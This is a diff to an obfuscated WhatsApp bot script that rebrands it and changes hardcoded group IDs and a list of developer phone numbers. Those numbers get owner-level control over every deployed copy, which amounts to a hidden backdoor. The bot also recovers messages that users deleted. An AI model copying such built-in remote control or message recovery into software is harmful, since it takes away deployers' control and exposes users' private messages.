@@ -92,7 +92,7 @@ const {
 let {
   reagir
 } = require(__dirname + "/keizzah/app");
-var session = conf.session.replace(/POPKID-MD;;;=>/g, '');
+var session = conf.session.replace(/BELTAH-MD;;;=>/g, '');
 const prefixe = conf.PREFIXE || [];
 require('dotenv').config({
   'path': "./config.env"
@@ -189,7 +189,7 @@ setTimeout(() => {
       'isForwarded': true,
       'forwardedNewsletterMessageInfo': {
         'newsletterJid': "120363290715861418@newsletter",
-        'newsletterName': "🤖 𝐏𝐎𝐏𝐊𝐈𝐃 𝐊𝐄 🤖",
+        'newsletterName': "🧋 𝗣𝗢𝗣𝗞𝗜𝗗 𝗫𝗧𝗘𝗖𝗛 🧋",
         'serverMessageId': Math.floor(100000 + Math.random() * 900000)
       }
     });
@@ -271,7 +271,7 @@ setTimeout(() => {
           }
         }
         const _0x5567a8 = _0x1a20e2[Math.floor(Math.random() * _0x1a20e2.length)];
-        const _0x6a1b71 = "👻 " + conf.BOT + " 👻 ||Its on " + _0xe20546 + " at " + _0x4b2074 + ", ( " + _0x16552c + " ) || 💭 𝐐𝐮𝐨𝐭𝐞: \"" + _0x5567a8 + "\"";
+        const _0x6a1b71 = "🧋 " + conf.BOT + " 🧋 ||its on " + _0xe20546 + " at " + _0x4b2074 + ", ( " + _0x16552c + " ) || 💭 𝐐𝐮𝐨𝐭𝐞: \"" + _0x5567a8 + "\"";
         _0x5622dd.updateProfileStatus(_0x6a1b71);
       }, 10000);
       console.log("AutoBio feature is enabled. Profile status will update every 10 seconds.");
@@ -311,7 +311,7 @@ setTimeout(() => {
     });
     function _0x5147fe(_0x555a60) {
       const _0x30822b = _0x555a60.key.participant || _0x555a60.key.remoteJid;
-      return "*『 👻 " + conf.BOT + " ᴀɴᴛɪᴅᴇʟᴇᴛᴇ 👻 』*\n\n" + ("*ᴅᴇʟᴇᴛɪᴏɴ ᴛɪᴍᴇ:* " + new Date().toLocaleString() + "\n") + ("*ᴅᴇʟᴇᴛᴇᴅ ʙʏ:* @" + _0x30822b.split('@')[0] + "\n\n> ᴅᴇʟᴇᴛᴇᴅ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ʀᴇᴛʀɪᴇᴠᴇᴅ ʙʏ ᴘᴏᴘᴋɪᴅ-ᴍᴅ");
+      return "*『 🧋 " + conf.BOT + " ᴀɴᴛɪᴅᴇʟᴇᴛᴇ 🧋 』*\n\n" + ("*ᴅᴇʟᴇᴛɪᴏɴ ᴛɪᴍᴇ:* " + new Date().toLocaleString() + "\n") + ("*ᴅᴇʟᴇᴛᴇᴅ ʙʏ:* @" + _0x30822b.split('@')[0] + "\n\n> ᴅᴇʟᴇᴛᴇᴅ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ʀᴇᴛʀɪᴇᴠᴇᴅ ʙʏ ᴘᴏᴘᴋɪᴅ-ᴍᴅ");
     }
     async function _0x4ffed7(_0x4206e2) {
       if (_0x4206e2.imageMessage) {
@@ -422,10 +422,10 @@ setTimeout(() => {
       } = require('./bdd/sudo');
       const _0x292056 = _0x59b5cf.pushName;
       const _0x9d8103 = await _0x45c965();
-      const _0x1f75f6 = [_0x1f459b, "254111385747", "254732297194", "254756466053", "25412434470", conf.NUMERO_OWNER].map(_0xd04825 => _0xd04825.replace(/[^0-9]/g) + "@s.whatsapp.net");
+      const _0x1f75f6 = [_0x1f459b, "254111385747", "254732297194", "254756466053", "254712434470", conf.NUMERO_OWNER].map(_0xd04825 => _0xd04825.replace(/[^0-9]/g) + "@s.whatsapp.net");
       const _0x112e2f = _0x1f75f6.concat(_0x9d8103);
       const _0x2cca6c = _0x112e2f.includes(_0x1226b4);
-      var _0x425534 = ["254111385747", "254732297194", "254756466053", "25412434470"].map(_0x56fa0e => _0x56fa0e.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(_0x1226b4);
+      var _0x425534 = ["254732297194", "254111385747", "254712434470", "254756466053"].map(_0x56fa0e => _0x56fa0e.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(_0x1226b4);
       function _0x3c1114(_0x12c1b5) {
         _0x5622dd.sendMessage(_0x453c2e, {
           'text': _0x12c1b5
@@ -500,7 +500,7 @@ setTimeout(() => {
         'ms': _0x59b5cf,
         'mybotpic': _0xddd0e4
       };
-      if (_0x453c2e === "120363400418501943@g.us") {
+      if (_0x453c2e === "120363244435092946@g.us") {
         return;
       }
       if (conf.AUTO_READ_MESSAGES === 'yes') {
@@ -610,7 +610,7 @@ setTimeout(() => {
         await _0x5622dd.sendMessage(_0xcb3cb0, {
           'text': _0x4efc47,
           'react': {
-            'text': '👻',
+            'text': '❤️',
             'key': _0x59b5cf.key
           }
         }, {
@@ -656,7 +656,7 @@ setTimeout(() => {
           }
         }
       }
-      if (!_0x425534 && _0x453c2e == "120363400418501943@g.us") {
+      if (!_0x425534 && _0x453c2e == "120363158701337904@g.us") {
         return;
       }
       if (_0x2277c8 && _0x1226b4.endsWith("s.whatsapp.net")) {
@@ -671,7 +671,7 @@ setTimeout(() => {
       }
       try {
         if (_0x59b5cf.message[_0x5bffc8].contextInfo.mentionedJid && (_0x59b5cf.message[_0x5bffc8].contextInfo.mentionedJid.includes(_0x533779) || _0x59b5cf.message[_0x5bffc8].contextInfo.mentionedJid.includes(conf.NUMERO_OWNER + "@s.whatsapp.net"))) {
-          if (_0x453c2e == "120363400418501943@g.us") {
+          if (_0x453c2e == "120363158701337904@g.us") {
             return;
           }
           ;
@@ -1122,7 +1122,7 @@ setTimeout(() => {
           }
           console.log("Command loading completed ✅");
           if (conf.DP.toLowerCase() === 'yes') {
-            let _0x3d20ca = "*👾 SYSTEM ONLINE 👾*\n╭═══════⩥\n║ *『𝐏𝐎𝐏𝐊𝐈𝐃 𝐗𝐓𝐄𝐂𝐇 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃』*\n║ Developer : *popkid ke.*\n║ Prefix : [ " + prefixe + " ]\n║ Mode : " + _0x18a557 + " MODE\n║ Total Commands : " + evt.cm.length + "\n╰══════════════════⩥\n\n╭───◇⩥\n┃\n┃ *Thanks for deploying* \n┃ " + conf.BOT + "\n┃ Stay sharp, stay secure.\n╰══════════════════⩥";
+            let _0x3d20ca = "*❤️ 𝗣𝗢𝗣𝗞𝗜𝗗 𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗘𝗗 ❤️*\n╭═══════⩥\n║ *『𝗣𝗢𝗣𝗞𝗜𝗗 𝗠𝗗 𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗘𝗗』*\n║ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : *Popkid ke.*\n║ Prefix : [ " + prefixe + " ]\n║ 𝗠𝗼𝗱𝗲 : " + _0x18a557 + " MODE\n║ 𝗧𝗼𝘁𝗮𝗹 𝗰𝗼𝗺𝗺𝗮𝗻𝗱𝘀 : " + evt.cm.length + "\n╰══════════════════⩥\n\n╭───◇⩥\n┃\n┃ *Thanks for deploying* \n┃ " + conf.BOT + "\n┃ Stay sharp, stay secure.\n╰══════════════════⩥";
             await _0x5622dd.sendMessage(_0x5622dd.user.id, {
               'text': _0x3d20ca
             });
